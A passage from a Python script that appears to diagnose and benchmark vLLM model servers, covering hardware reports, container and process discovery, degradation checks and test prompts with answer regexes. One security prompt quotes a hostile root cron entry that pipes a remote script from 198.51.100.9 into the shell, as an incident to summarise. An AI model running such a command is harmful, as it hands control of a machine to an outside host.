        f"4 0 obj<</Length {len(stream_body)}>>stream\n".encode("ascii"),
        stream_body,
        b"endstream endobj\n",
        b"5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj\n",
        b"trailer<</Size 6/Root 1 0 R>>\n",
        b"%%EOF\n",
    ]
    pdf_bytes = b"".join(pdf_parts)

    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
        f.write(pdf_bytes)
        pdf_path = f.name
    try:
        out = subprocess.run(
            ["pdftotext", pdf_path, "-"], capture_output=True, text=True, timeout=10
        )
        return out.stdout or ""
    except Exception:
        return ""
    finally:
        try:
            os.unlink(pdf_path)
        except OSError:
            pass


PDF_TEXT = build_pdf_and_extract_text()


# ─────────────────────────────────────────────────────────────────────────────
# System hardware
# ─────────────────────────────────────────────────────────────────────────────
def run_cmd(args: list[str], timeout: int = 5) -> str:
    try:
        out = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        return out.stdout
    except Exception:
        return ""


def cpu_utilization(os_type: str) -> str:
    if os_type == "Linux" and os.path.exists("/proc/stat"):
        try:

            def sample():
                with open("/proc/stat") as f:
                    parts = f.readline().split()
                nums = [int(x) for x in parts[1:8]]
                return sum(nums), nums[3]

            t1, i1 = sample()
            time.sleep(0.3)
            t2, i2 = sample()
            dt, di = t2 - t1, i2 - i1
            if dt > 0:
                return f"{100 * (1 - di / dt):.1f}"
        except Exception:
            pass
        return "n/a"
    elif os_type == "Darwin":
        out = run_cmd(["top", "-l", "1", "-n", "0"], timeout=5)
        m = re.search(r"([\d.]+)%\s*idle", out)
        if m:
            return f"{100 - float(m.group(1)):.1f}"
        return "n/a"
    return "n/a"


def print_system_hardware() -> None:
    section("System Hardware")
    os_type = os.uname().sysname if hasattr(os, "uname") else "Unknown"
    arch = os.uname().machine if hasattr(os, "uname") else "unknown"
    cinfo(f"Platform : {os_type} / {arch}")

    if os_type == "Linux":
        cpu_name = "unknown"
        try:
            with open("/proc/cpuinfo") as f:
                for line in f:
                    if line.lower().startswith("model name"):
                        cpu_name = line.split(":", 1)[1].strip()
                        break
        except Exception:
            pass
        cores = os.cpu_count() or "?"
        ram = run_cmd(["free", "-h"])
        ram_info = "unknown"
        for line in ram.splitlines():
            if line.startswith("Mem:"):
                cols = line.split()
                ram_info = f"total={cols[1]}  used={cols[2]}  free={cols[3]}"
        cinfo(f"CPU      : {cpu_name}  ({cores} cores)")
        cinfo(f"CPU Util : {cpu_utilization(os_type)}%")
        cinfo(f"RAM      : {ram_info}")
    elif os_type == "Darwin":
        cpu_name = run_cmd(["sysctl", "-n", "machdep.cpu.brand_string"]).strip() or "unknown"
        mem_bytes = run_cmd(["sysctl", "-n", "hw.memsize"]).strip()
        try:
            total_ram = f"{int(mem_bytes) / 1073741824:.1f} GB"
        except ValueError:
            total_ram = "unknown"
        cinfo(f"CPU      : {cpu_name}")
        cinfo(f"CPU Util : {cpu_utilization(os_type)}%")
        cinfo(f"RAM      : {total_ram}")

    if shutil.which("nvidia-smi") and run_cmd(["nvidia-smi"], timeout=5):
        driver_out = run_cmd(["nvidia-smi"], timeout=5)
        driver_m = re.search(r"Driver Version:\s*([\d.]+)", driver_out)
        cuda_m = re.search(r"CUDA Version:\s*([\d.]+)", driver_out)
        driver_ver = driver_m.group(1) if driver_m else "n/a"
        cuda_ver = cuda_m.group(1) if cuda_m else "n/a"
        gpu_count = run_cmd(["nvidia-smi", "--query-gpu=count", "--format=csv,noheader"]).splitlines()
        gpu_count_s = gpu_count[0].strip() if gpu_count else "?"
        cinfo(f"GPU      : NVIDIA  (driver={driver_ver}  CUDA={cuda_ver}  count={gpu_count_s})")

        # Generic NVIDIA memory/util query — also covers unified-memory Grace
        # Blackwell (GB10) and Grace Hopper (GH200) superchips, which still
        # expose their GPU memory pool through nvidia-smi like any other
        # CUDA-visible device.
        query_out = run_cmd(
            [
                "nvidia-smi",
                "--query-gpu=index,name,memory.total,memory.used,memory.free,utilization.gpu,temperature.gpu",
                "--format=csv,noheader,nounits",
            ]
        )
        any_mem = False
        for line in query_out.splitlines():
            cols = [c.strip() for c in line.split(",")]
            if len(cols) != 7:
                continue
            idx, name, mtot, mused, mfree, util, temp = cols
            if mtot and mtot != "[N/A]":
                any_mem = True
            console.print(f"  [GPU {idx}] {name}")
            console.print(f"           VRAM : {mtot} MiB total  |  {mused} MiB used  |  {mfree} MiB free")
            console.print(f"           Util : {util}%  |  Temp: {temp}°C")
        if not any_mem:
            cwarn(
                "nvidia-smi found a GPU but reported no memory figures (seen on some "
                "unified-memory superchips like GB10) — check 'nvidia-smi -q' manually"
            )
    elif shutil.which("rocm-smi") and run_cmd(["rocm-smi"], timeout=5):
        rocminfo_out = run_cmd(["rocminfo"], timeout=5)
        rocm_m = re.search(r"ROCm Version:\s*([\d.]+)", rocminfo_out)
        cinfo(f"GPU      : AMD ROCm  (version={rocm_m.group(1) if rocm_m else 'n/a'})")
        out = run_cmd(["rocm-smi", "--showmeminfo", "vram", "--showuse", "--showtemp"], timeout=5)
        for line in out.splitlines():
            if line.strip():
                console.print(f"  {line}")
    elif os_type == "Darwin":
        gpu_out = run_cmd(["system_profiler", "SPDisplaysDataType"], timeout=10)
        fields = [
            ln.strip()
            for ln in gpu_out.splitlines()
            if re.search(r"Chipset Model|Total Number of Cores|VRAM|Metal", ln)
        ]
        cinfo(f"GPU      : Apple Silicon / Metal  —  {'  '.join(fields) if fields else 'unknown'}")
    else:
        cwarn("GPU      : None detected — CPU-only inference")


# ─────────────────────────────────────────────────────────────────────────────
# Instance discovery
# ─────────────────────────────────────────────────────────────────────────────
VLLM_PROC_RE = re.compile(r"vllm serve|vllm[._]entrypoints[._]openai|[Vv]llm.*api_server")

# Container front-ends whose own command line carries the vLLM arguments
# (`docker run ... vllm serve X --served-model-name primary`). They match
# VLLM_PROC_RE but are only the client: they own no listening socket and no
# GPU memory — the real server runs under containerd-shim. They're still
# returned (flagged container_cli) so nothing changes when no container
# runtime is reachable, but once the matching container is found via
# `docker inspect`, the container's own ports/PIDs are used instead.
CONTAINER_CLI_NAMES = {"docker", "podman", "nerdctl", "docker-compose", "sudo"}


def _is_container_cli(command: str) -> bool:
    tokens = command.split()
    while tokens and os.path.basename(tokens[0]) == "sudo":
        tokens = tokens[1:]
    if not tokens:
        return False
    return os.path.basename(tokens[0]) in CONTAINER_CLI_NAMES or "containerd-shim" in tokens[0]


def find_vllm_processes() -> list[dict]:
    ps_out = run_cmd(["ps", "aux"], timeout=5)
    procs = []
    for line in ps_out.splitlines():
        if not VLLM_PROC_RE.search(line) or "grep" in line:
            continue
        cols = line.split(None, 10)
        if len(cols) < 11:
            continue
        model_m = re.search(r"--served-model-name[= ](\S+)", line) or re.search(r"vllm serve (\S+)", line)
        procs.append({
            "pid": cols[1],
            "model": model_m.group(1) if model_m else "(from /v1/models)",
            "line": line,
            "container_cli": _is_container_cli(cols[10]),
        })
    return procs


def container_runtime() -> Optional[str]:
    for rt in ("docker", "podman"):
        if shutil.which(rt):
            return rt
    return None


def container_uptime_hours(started_at: str) -> Optional[float]:
    # Docker reports StartedAt as RFC3339 UTC with nanoseconds, e.g.
    # 2026-10-03T14:02:11.123456789Z — strptime can't take the nanoseconds.
    m = re.match(r"(\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d)", started_at or "")
    if not m or m.group(1).startswith("0001"):
        return None
    try:
        return (time.time() - calendar.timegm(time.strptime(m.group(1), "%Y-%m-%dT%H:%M:%S"))) / 3600
    except ValueError:
        return None


def find_vllm_containers(procs: list[dict]) -> list[dict]:
    """Running containers serving vLLM, with the host-reachable (host, port)
    targets resolved from their network mode / published ports."""
    rt = container_runtime()
    if not rt:
        return []
    ids = run_cmd([rt, "ps", "-q", "--no-trunc"], timeout=10).split()
    if not ids:
        return []
    try:
        data = json.loads(run_cmd([rt, "inspect", *ids], timeout=20) or "[]")
    except ValueError:
        return []

    containers = []
    for c in data:
        cfg = c.get("Config") or {}
        state = c.get("State") or {}
        host_cfg = c.get("HostConfig") or {}
        net = c.get("NetworkSettings") or {}
        cmd = " ".join((cfg.get("Entrypoint") or []) + (cfg.get("Cmd") or []))
        image = cfg.get("Image") or c.get("Image", "")

        init_pid = str(state.get("Pid") or "0")
        tree = descendant_pids({init_pid}) if init_pid != "0" else set()
        inner_procs = [p for p in procs if p["pid"] in tree and not p["container_cli"]]

        if not inner_procs and not re.search(r"vllm", f"{image} {cmd}", re.IGNORECASE):
            continue

        # Port vLLM listens on *inside* the container.
        inner_ports: list[str] = []
        for text in [p["line"] for p in inner_procs] + [cmd]:
            m = re.search(r"--port[= ](\d+)", text)
            if m and m.group(1) not in inner_ports:
                inner_ports.append(m.group(1))
        if not inner_ports:
            env = dict(e.split("=", 1) for e in (cfg.get("Env") or []) if "=" in e)
            inner_ports = [env["PORT"]] if env.get("PORT", "").isdigit() else ["8000"]

        targets: list[tuple[str, str]] = []
        network_mode = host_cfg.get("NetworkMode", "")
        if network_mode == "host":
            targets = [("localhost", p) for p in inner_ports]
        else:
            published = net.get("Ports") or {}
            for p in inner_ports:
                for binding in published.get(f"{p}/tcp") or []:
                    if binding.get("HostPort"):
                        targets.append(("localhost", binding["HostPort"]))
            if not targets:
                # Not published on the expected port — fall back to any
                # published TCP port, then to the container's own IP (reachable
                # from the host on Linux bridge networks, not on Docker Desktop).
                for key, bindings in published.items():
                    if key.endswith("/tcp"):
                        targets += [("localhost", b["HostPort"]) for b in bindings or [] if b.get("HostPort")]
            if not targets:
                ips = [n.get("IPAddress") for n in (net.get("Networks") or {}).values() if n.get("IPAddress")]
                if ips:
                    targets = [(ips[0], p) for p in inner_ports]

        model_m = None
        for text in [p["line"] for p in inner_procs] + [cmd]:
            model_m = re.search(r"--served-model-name[= ](\S+)", text) or re.search(r"vllm serve (\S+)", text)
            if model_m:
                break

        containers.append({
            "runtime": rt,
            "id": c.get("Id", "")[:12],
            "name": (c.get("Name") or "").lstrip("/"),
            "image": image,
            "network": network_mode or "default",
            "init_pid": init_pid,
            "pids": tree,
            "procs": inner_procs,
            "model": model_m.group(1) if model_m else "(from /v1/models)",
            "uptime_h": container_uptime_hours(state.get("StartedAt", "")),
            "ipc": host_cfg.get("IpcMode", ""),
            "shm_size": host_cfg.get("ShmSize") or 0,
            "targets": list(dict.fromkeys(targets)),
        })
    return containers


def listen_ports_for_pid(pid: str) -> list[str]:
    if shutil.which("lsof"):
        out = run_cmd(["lsof", "-Pan", "-p", pid, "-iTCP", "-sTCP:LISTEN"], timeout=5)
        ports = []
        for line in out.splitlines()[1:]:
            cols = line.split()
            if cols:
                addr = cols[-2] if len(cols) >= 2 else ""
                m = re.search(r":(\d+)$", addr)
                if m:
                    ports.append(m.group(1))
        return ports
    return []


DISCOVERED_CONTAINERS: list[dict] = []


def discover_instances(host: str) -> list[tuple[str, str]]:
    procs = find_vllm_processes()
    containers = find_vllm_containers(procs)
    DISCOVERED_CONTAINERS[:] = containers

    if not procs and not containers:
        cwarn("No running vLLM processes or containers found on this host")
        return []

    targets: list[tuple[str, str]] = []

    containerized_pids: set[str] = set()
    if containers:
        cinfo(f"Found {len(containers)} vLLM container(s); resolving published ports...")
        for ct in containers:
            containerized_pids |= ct["pids"]
            if not ct["targets"]:
                cwarn(
                    f"  {ct['runtime']} {ct['name']} ({ct['image']}): no published port or container IP found — "
                    f"pass the port explicitly: {sys.argv[0]} {host} <port>"
                )
                continue
            for t_host, t_port in ct["targets"]:
                # Discovery is local; only rewrite the host when the fallback
                # resolved a container IP rather than a published port.
                t_host = host if t_host == "localhost" else t_host
                console.print(
                    f"  {ct['runtime']} {ct['name']}  |  port={t_port}  net={ct['network']}  model={ct['model']}"
                )
                targets.append((t_host, t_port))

    host_procs = [
        p for p in procs
        if p["pid"] not in containerized_pids and not (p["container_cli"] and containers)
    ]
    if host_procs:
        cinfo(f"Found {len(host_procs)} vLLM-related process(es); resolving ports...")
    for proc in host_procs:
        pid, line, model_name = proc["pid"], proc["line"], proc["model"]
        host_bind_m = re.search(r"--host[= ](\S+)", line)
        port_flag_m = re.search(r"--port[= ](\d+)", line)

        ports_found: list[str] = []
        if port_flag_m:
            ports_found.append(port_flag_m.group(1))
        else:
            ports_found = listen_ports_for_pid(pid) or ["8000"]

        host_bind = host_bind_m.group(1) if host_bind_m else "0.0.0.0"

        for p in ports_found:
            console.print(f"  PID {pid}  |  port={p}  host={host_bind}  model={model_name}")
            targets.append((host, p))

    # Dedup while preserving numeric port order.
    return sorted(set(targets), key=lambda t: (int(t[1]), t[0]))


def format_targets(targets: list[tuple[str, str]]) -> str:
    return ", ".join(f"{h}:{p}" for h, p in targets)


# ─────────────────────────────────────────────────────────────────────────────
# Performance degradation check — runs once, before any instance is tested.
# Diagnoses the "gets slow / stops responding after a few days" pattern by
# checking the usual suspects (GPU memory/thermal pressure, orphaned CUDA
# contexts, host swap, file-descriptor exhaustion, disk space) and comparing
# today's snapshot against a small local history file to catch slow leaks.
# ─────────────────────────────────────────────────────────────────────────────
HISTORY_PATH = os.path.expanduser("~/.cache/tester_llm_history.json")


def load_history() -> dict:
    try:
        with open(HISTORY_PATH) as f:
            return json.load(f)
    except Exception:
        return {}


def save_history(history: dict) -> None:
    try:
        os.makedirs(os.path.dirname(HISTORY_PATH), exist_ok=True)
        with open(HISTORY_PATH, "w") as f:
            json.dump(history, f, indent=2)
    except Exception:
        pass


def process_uptime_hours(pid: str) -> Optional[float]:
    # macOS ps has no `etimes` (seconds elapsed) keyword like Linux procps does,
    # so start time (`lstart`, supported on both) plus wall clock is the
    # portable way to get uptime.
    out = run_cmd(["ps", "-o", "lstart=", "-p", pid], timeout=5).strip()
    if not out:
        return None
    try:
        started = time.mktime(time.strptime(out, "%a %b %d %H:%M:%S %Y"))
        return (time.time() - started) / 3600
    except ValueError:
        return None


def find_process_log_paths(pid: str) -> list[str]:
    if not shutil.which("lsof"):
        return []
    out = run_cmd(["lsof", "-a", "-p", pid, "-d", "0,1,2", "-Fn"], timeout=5)
    paths = []
    for line in out.splitlines():
        if not line.startswith("n"):
            continue
        path = line[1:].strip()
        if not path or path == "/dev/null" or path.startswith("/dev/tty"):
            continue
        if path in ("pipe", "socket") or path.startswith(("socket:", "pipe:", "|", "anon_inode:")):
            continue
        paths.append(path)
    return sorted(set(paths))


def open_fd_count(pid: str) -> Optional[int]:
    proc_fd = f"/proc/{pid}/fd"
    if os.path.isdir(proc_fd):
        try:
            return len(os.listdir(proc_fd))
        except Exception:
            pass
    if shutil.which("lsof"):
        out = run_cmd(["lsof", "-p", pid], timeout=10)
        lines = [ln for ln in out.splitlines() if ln.strip()]
        return max(len(lines) - 1, 0) if lines else None
    return None


def fd_soft_limit() -> Optional[int]:
    try:
        import resource
        return resource.getrlimit(resource.RLIMIT_NOFILE)[0]
    except Exception:
        return None


def swap_usage_pct(os_type: str) -> Optional[float]:
    if os_type == "Linux":
        try:
            info = {}
            with open("/proc/meminfo") as f:
                for line in f:
                    k, v = line.split(":", 1)
                    info[k.strip()] = v.strip()
            total = float(info["SwapTotal"].split()[0])
            free = float(info["SwapFree"].split()[0])
            return 100 * (1 - free / total) if total > 0 else 0.0
        except Exception:
            return None
    elif os_type == "Darwin":
        out = run_cmd(["sysctl", "-n", "vm.swapusage"], timeout=5)
        used_m = re.search(r"used\s*=\s*([\d.]+)M", out)
        total_m = re.search(r"total\s*=\s*([\d.]+)M", out)
        if used_m and total_m:
            try:
                used, total = float(used_m.group(1)), float(total_m.group(1))
                return 100 * used / total if total > 0 else 0.0
            except ValueError:
                return None
    return None


def disk_free_pct(path: str = "/") -> Optional[float]:
    try:
        st = os.statvfs(path)
        total = st.f_blocks * st.f_frsize
        free = st.f_bavail * st.f_frsize
        return 100 * free / total if total else None
    except Exception:
        return None


def gpu_snapshot() -> list[dict]:
    if not shutil.which("nvidia-smi"):
        return []
    out = run_cmd(
        [
            "nvidia-smi",
            "--query-gpu=index,memory.total,memory.used,utilization.gpu,temperature.gpu",
            "--format=csv,noheader,nounits",
        ],
        timeout=5,
    )
    gpus = []
    for line in out.splitlines():
        cols = [c.strip() for c in line.split(",")]
        if len(cols) != 5:
            continue
        try:
            gpus.append({
                "index": cols[0],
                "mem_total": float(cols[1]),
                "mem_used": float(cols[2]),
                "util": float(cols[3]),
                "temp": float(cols[4]),
            })
        except ValueError:
            continue
    return gpus


def descendant_pids(root_pids: set[str]) -> set[str]:
    # vLLM's V1 engine (and any tensor-parallel config) runs the actual CUDA
    # context in separate engine-core/worker subprocesses, not the "vllm serve"
    # PID found via ps aux — so orphan detection must walk the whole process
    # tree under each known PID, or it flags vLLM's own workers as "leaked".
    out = run_cmd(["ps", "-A", "-o", "pid,ppid"], timeout=5)
    children: dict[str, list[str]] = {}
    for line in out.splitlines()[1:]:
        cols = line.split()
        if len(cols) != 2:
            continue
        pid, ppid = cols
        children.setdefault(ppid, []).append(pid)

    all_pids = set(root_pids)
    frontier = list(root_pids)
    while frontier:
        pid = frontier.pop()
        for child in children.get(pid, []):
            if child not in all_pids:
                all_pids.add(child)
                frontier.append(child)
    return all_pids


def gpu_orphan_processes(known_pids: set[str]) -> list[str]:
    if not shutil.which("nvidia-smi"):
        return []
    out = run_cmd(
        ["nvidia-smi", "--query-compute-apps=pid,used_memory", "--format=csv,noheader,nounits"], timeout=5
    )
    orphans = []
    for line in out.splitlines():
        cols = [c.strip() for c in line.split(",")]
        if len(cols) != 2:
            continue
        pid, mem = cols
        if pid and pid not in known_pids:
            orphans.append(f"PID {pid} holding {mem} MiB")
    return orphans


def run_performance_health_check(host: str) -> bool:
    """Returns True if the full instance test suite should proceed."""
    section("Performance Degradation Check", "bright_red")
    os_type = os.uname().sysname if hasattr(os, "uname") else "Unknown"

    procs = find_vllm_processes()
    containers = find_vllm_containers(procs)
    if not procs and not containers:
        cwarn("No running vLLM process found — skipping degradation check")
        return True

    pids = {p["pid"] for p in procs}
    for ct in containers:
        # Every process inside a vLLM container (API server, EngineCore,
        # workers) is legitimately holding GPU memory — not an orphan.
        pids |= ct["pids"]
    findings: list[str] = []
    snapshot: dict = {"timestamp": time.time()}

    # ── Per-container identity (Docker/Podman-served vLLM) ──────────────────
    if containers:
        cinfo(f"Found {len(containers)} vLLM container(s):")
    for ct in containers:
        uptime_h = ct["uptime_h"]
        uptime_s = f"{uptime_h:.1f}h uptime" if uptime_h is not None else "uptime unknown"
        ports_s = format_targets(ct["targets"]) or "no published port"
        console.print(
            f"  • {ct['runtime']} {ct['name']} ({ct['id']})  |  image={ct['image']}  |  model={ct['model']}  "
            f"|  {ports_s}  |  {uptime_s}"
        )
        console.print(f"      log: `{ct['runtime']} logs -f {ct['name']}`")
        if uptime_h is not None:
            snapshot.setdefault("uptime_h", {})[ct["name"]] = round(uptime_h, 1)
            if uptime_h > 72:
                findings.append(
                    f"Container {ct['name']} ({ct['model']}) has been running for {uptime_h:.1f}h (>3 days). "
                    "vLLM's GPU allocator and KV cache can accumulate fragmentation over long uptimes on some "
                    "versions, which shows up as gradual slowdowns or stalls that only clear on restart."
                )

    # ── Per-process identity + log location, so a slowdown can be traced ────
    # Container CLI clients are covered by the container listing above when
    # their container was found; otherwise they're reported as before.
    if containers:
        procs = [p for p in procs if not p["container_cli"]]
    if procs:
        cinfo(f"Found {len(procs)} vLLM process(es):")
    for p in procs:
        uptime_h = process_uptime_hours(p["pid"])
        uptime_s = f"{uptime_h:.1f}h uptime" if uptime_h is not None else "uptime unknown"
        console.print(f"  • PID {p['pid']}  |  model={p['model']}  |  {uptime_s}")
        log_paths = find_process_log_paths(p["pid"])
        if log_paths:
            for lp in log_paths:
                console.print(f"      log: {lp}")
        else:
            console.print(
                f"      log: stdout/stderr not attached to a file (likely systemd/journald or a live "
                f"terminal) — try `journalctl _PID={p['pid']} -f` or check your process supervisor"
            )
        if uptime_h is not None:
            snapshot.setdefault("uptime_h", {})[p["pid"]] = round(uptime_h, 1)
            if uptime_h > 72:
                findings.append(
                    f"PID {p['pid']} ({p['model']}) has been running for {uptime_h:.1f}h (>3 days). vLLM's "
                    "GPU allocator and KV cache can accumulate fragmentation over long uptimes on some "
                    "versions, which shows up as gradual slowdowns or stalls that only clear on restart."
                )

    # ── GPU memory/thermal pressure ──────────────────────────────────────────
    gpus = gpu_snapshot()
    for g in gpus:
        pct = 100 * g["mem_used"] / g["mem_total"] if g["mem_total"] else 0
        cinfo(
            f"GPU {g['index']}: {g['mem_used']:.0f}/{g['mem_total']:.0f} MiB used ({pct:.0f}%), "
            f"util={g['util']:.0f}%, temp={g['temp']:.0f}°C"
        )
        snapshot.setdefault("gpu", []).append(
            {"index": g["index"], "mem_pct": round(pct, 1), "util": g["util"], "temp": g["temp"]}
        )
        if pct > 95:
            findings.append(
                f"GPU {g['index']} memory is at {pct:.0f}% — very little headroom left for KV cache growth "
                "under load, which causes request queuing/timeouts that look like the server 'stopped responding'."
            )
        if g["temp"] > 85:
            findings.append(
                f"GPU {g['index']} temperature is {g['temp']:.0f}°C — thermal throttling reduces clocks and "
                "silently slows generation speed without any errors."
            )

    orphans = gpu_orphan_processes(descendant_pids(pids))
    if orphans:
        findings.append(
            "Found GPU compute process(es) NOT matching the running vLLM PID(s): " + "; ".join(orphans) + ". "
            "These are leaked/orphaned CUDA contexts (e.g. from a prior crashed worker or an OOM-killed "
            "process) that permanently hold GPU memory until killed, shrinking what's available to the live server."
        )

    # ── Host memory pressure ─────────────────────────────────────────────────
    swap_pct = swap_usage_pct(os_type)
    if swap_pct is not None:
        snapshot["swap_pct"] = round(swap_pct, 1)
        cinfo(f"Swap usage: {swap_pct:.1f}%")
        if swap_pct > 20:
            findings.append(
                f"System swap usage is {swap_pct:.1f}%. Once the host starts swapping, any CPU-side work "
                "vLLM does (tokenization, request scheduling, HTTP handling) slows down dramatically."
            )

    # ── File-descriptor exhaustion ───────────────────────────────────────────
    fd_limit = fd_soft_limit()
    for p in procs:
        fd_count = open_fd_count(p["pid"])
        if fd_count is not None:
            snapshot.setdefault("fd_count", {})[p["pid"]] = fd_count
            cinfo(f"PID {p['pid']}: {fd_count} open file descriptors" + (f" (soft limit {fd_limit})" if fd_limit else ""))
            if fd_limit and fd_count > 0.85 * fd_limit:
                findings.append(
                    f"PID {p['pid']} has {fd_count} open file descriptors, close to the soft limit of "
                    f"{fd_limit}. A slow client, reverse proxy, or connection leak that never closes sockets "
                    "will eventually exhaust this and the server will stop accepting new requests."
                )

    # ── Disk space ────────────────────────────────────────────────────────────
    free_pct = disk_free_pct("/")
    if free_pct is not None:
        snapshot["disk_free_pct"] = round(free_pct, 1)
        cinfo(f"Root filesystem free space: {free_pct:.1f}%")
        if free_pct < 5:
            findings.append(
                f"Root filesystem is at {free_pct:.1f}% free space. When disks fill up, log writes and any "
                "on-disk caching (prefix cache, model weights swap) start failing or blocking, which can "
                "freeze the server instead of erroring cleanly."
            )

    # ── Trend vs. history (catches slow leaks a single snapshot can't) ──────
    history = load_history()
    prev_runs = history.get(host, [])
    if prev_runs:
        last = prev_runs[-1]
        if "gpu" in last and "gpu" in snapshot:
            for cur_g, prev_g in zip(snapshot["gpu"], last["gpu"]):
                delta = cur_g["mem_pct"] - prev_g["mem_pct"]
                if delta > 15:
                    last_ts = time.strftime("%Y-%m-%d %H:%M", time.localtime(last["timestamp"]))
                    findings.append(
                        f"GPU {cur_g['index']} memory usage climbed from {prev_g['mem_pct']:.0f}% to "
                        f"{cur_g['mem_pct']:.0f}% since the last run on {last_ts} with no corresponding rise "
                        "in utilization — consistent with a slow memory leak rather than normal load."
                    )

    if findings:
        cfail(f"Detected {len(findings)} potential cause(s) of performance degradation:")
        for i, f in enumerate(findings, 1):
            console.print(f"  [bold red]{i}.[/bold red] {f}")
        console.print()
        console.print("[bold]Suggested fixes:[/bold]")
        console.print(
            "  • Schedule a periodic vLLM restart (systemd timer or cron, every 24-48h) as a stopgap "
            "against long-uptime fragmentation until the root cause is confirmed."
        )
        console.print(
            "  • Kill any orphaned GPU compute processes reported above (`kill <pid>`) — they hold memory "
            "permanently and are never released without one."
        )
        console.print(
            "  • Lower vLLM's `--gpu-memory-utilization` slightly (e.g. 0.90 -> 0.85) to leave headroom for "
            "fragmentation and avoid OOM-triggered stalls under sustained load."
        )
        console.print(
            "  • If FD counts are climbing, look for a client/load-balancer/reverse-proxy that isn't closing "
            "connections, and check its keep-alive/timeout settings."
        )
        console.print(
            "  • Check GPU cooling/airflow if temperatures are consistently high — thermal throttling "
            "silently cuts generation speed long before the server looks 'down'."
        )
        console.print("  • Free up disk space or move logs to a larger volume if the root filesystem is near full.")
        console.print(
            f"  • Check the log paths printed above for OOM/CUDA errors around the time it slowed down. "
            f"Re-run this script periodically (e.g. via cron) so {HISTORY_PATH} builds a trend and future "
            "runs catch slow leaks earlier."
        )
    else:
        cpass("No signs of performance degradation detected")

    prev_runs.append(snapshot)
    history[host] = prev_runs[-20:]  # rolling window
    save_history(history)

    if not findings:
        return True

    # Instance tests below run up to 40 live model requests (some with 300s
    # timeouts) per instance — under the conditions just flagged, that suite
    # may hang or take far longer than usual instead of completing normally.
    console.print()
    if not sys.stdin.isatty():
        cwarn("Non-interactive session — proceeding with the full test suite despite the issues above.")
        return True
    try:
        resp = input(
            "Given the issues above, the full test suite (40 live model requests per instance) may hang "
            "or fail to complete. Continue anyway? [y/N]: "
        ).strip().lower()
    except (EOFError, KeyboardInterrupt):
        resp = "n"
        console.print()
    if resp in ("y", "yes"):
        return True
    cwarn("Skipping instance tests — resolve the issues above, or re-run and choose to continue anyway.")
    return False


# ─────────────────────────────────────────────────────────────────────────────
# Workload questions — copied verbatim from tester_llamacpp.py
# ─────────────────────────────────────────────────────────────────────────────
# (category, prompt, optional regex for an informational "answer looks right" check)
# Regexes use lookaheads so every required fact must appear, in any order.
MEETING_TRANSCRIPT = (
    "Priya: Okay, let's start. The BGP session to our upstream flapped twice last night.\n"
    "Marcus: I saw that. The provider says it was a maintenance window they forgot to announce.\n"
    "Priya: We were also hit by a UDP flood around 2 AM, about 40 gigabits. RTBH kicked in and blackholed the target /32.\n"
    "Marcus: That worked, but it took the customer offline. I want us to move to FlowSpec so we only drop the attack traffic.\n"
    "Priya: Agreed, but the upstream has to support it. Marcus, can you ask them by Friday?\n"
    "Marcus: Yes, I'll email them today. Also, Dana needs to update the runbook with the RTBH community string.\n"
    "Priya: Good. I'll schedule the failover test for next Tuesday at 10 AM. Anything else? No? Thanks everyone."
)

NOISY_ASR = (
    "so um the B G P session to the upstream flapped twice last night and then we got hit by a you dee pee flood "
    "about forty gig. R T B H kicked in and black holed the slash thirty two. Marcus wants flow spec instead. "
    "also the F five big IP pair failed over at two A M and Dana thinks its the health monitor."
)

# Category prefix ("Finance:", "F5:", ...) is the area; --only matches it case-insensitively.
QUESTIONS = [
    # ── 1. Financial analysis and predictions ────────────────────────────────
    ("Finance: growth & projection",
     "Quarterly revenue in $M: Q1 12.0, Q2 13.2, Q3 14.5, Q4 15.9. Costs in $M: 9.0, 9.6, 10.4, 11.3. "
     "Compute the quarter-over-quarter revenue growth rate and the gross margin for each quarter, then project "
     "Q1 of next year's revenue with your stated assumption, and name one risk to that forecast.",
     r"(?=.*\b17\.\d)(?=.*margin)"),
    ("Finance: NPV",
     "An investment costs $100k today and returns $30k, $40k, $50k and $60k at the end of years 1 to 4. "
     "With a 10% discount rate, what is the NPV, and is the investment worthwhile? Show the discounted cash flows.",
     r"(?=.*38[.,]?[89])(?=.*(worthwhile|positive|accept|yes))"),
    ("Finance: prediction honesty",
     "A stock has risen 5 days in a row. My friend says that guarantees it will rise tomorrow. Is that right? "
     "Answer briefly and say what would actually inform a forecast.",
     r"(?=.*(not (a |mathematically )?guarantee|no guarantee|cannot|can't|isn't|incorrect|wrong|fallacy|not necessarily|random walk|uncertain))"),

    # ── 2. Network / computer security ───────────────────────────────────────
    ("Security: incident summary",
     "Summarize this incident in 3 sentences and give 3 recommended actions:\n"
     "sshd: 40 'Failed password for root' from 203.0.113.45 within 60 seconds; then "
     "'Accepted password for root from 203.0.113.45'; then a new cron entry '* * * * * curl http://198.51.100.9/x.sh | sh' "
     "was added for root.",
     r"(?=.*(brute|credential|password|failed login))(?=.*(compromis|breach|persistence|cron))"),
    ("Security: IDS vs IPS vs WAF",
     "In a few sentences, explain the difference between an IDS and an IPS, where a WAF fits, and why TLS 1.0 "
     "should be disabled.",
     r"(?=.*detect)(?=.*(prevent|block|inline))(?=.*(HTTP|web|layer 7|application))(?=.*(deprecat|weak|vulnerab|POODLE|BEAST|insecure))"),
    ("Security: firewall rule review",
     "Review this ACL, evaluated top to bottom, and point out every problem:\n"
     "1) allow tcp any -> 10.0.0.5:22\n2) deny ip any any\n3) allow tcp 10.0.0.0/24 -> 10.0.0.5:443",
     r"(?=.*(shadow|never (match|hit|reach)|unreachable|ordering|order|after the deny))(?=.*(any|internet|exposed|open|22|ssh))"),

    # ── 3. Code generation ───────────────────────────────────────────────────
    ("Code: Python",
     "Write a Python function top_ips(log_lines, n=5) that parses nginx access log lines "
     "(client IP is the first field) and returns the n most frequent IPs with counts. Include a short usage example.",
     r"def\s+top_ips"),
    ("Code: Python debugging",
     "This function has a classic bug. Explain it and give the fix:\n\n"
     "def add_tag(tag, tags=[]):\n    tags.append(tag)\n    return tags",
     r"(?=.*(mutable|shared|same list|persist))(?=.*(None))"),
    ("Code: HTML / CSS / JS",
     "Write a single-file HTML page with inline CSS and JavaScript containing a button that toggles dark mode "
     "and remembers the choice across page reloads.",
     r"(?=.*(<html|<!doctype))(?=.*localStorage)(?=.*(addEventListener|onclick))"),
    ("Code: Tcl (F5 iRule) + PHP",
     "Give two snippets. 1) An F5 BIG-IP iRule (Tcl) that redirects all HTTP requests to HTTPS. "
     "2) A PHP function that fetches a user row by email using a PDO prepared statement.",
